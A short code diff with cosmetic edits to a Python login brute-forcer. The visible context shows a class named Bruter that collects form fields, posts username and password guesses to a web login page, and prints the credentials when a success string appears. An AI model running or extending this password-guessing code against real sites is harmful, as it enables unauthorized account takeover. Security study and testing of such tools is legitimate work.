@@ -22,7 +22,7 @@ def get_words():
     return words
 
 def get_params(content):
-    params = dict()
+    params = {}
     parser = etree.HTMLParser()
     tree = etree.parse(BytesIO(content), parser=parser)
     for elem in tree.findall('//input'):
@@ -56,11 +56,11 @@ class Bruter:
             print(f'Trying username/password {self.username}/{passwd:<10}')
             params['pwd'] = passwd
             resp1 = session.post(self.url, data=params)
-            
+
             if SUCCESS in resp1.content.decode():
                 self.found = True
                 print(f"\nBruteforcing successful.")
-                print("Username is %s" % self.username)
+                print(f"Username is {self.username}")
                 print("Password is %s\n" % passwd)
                 self.found = True
 
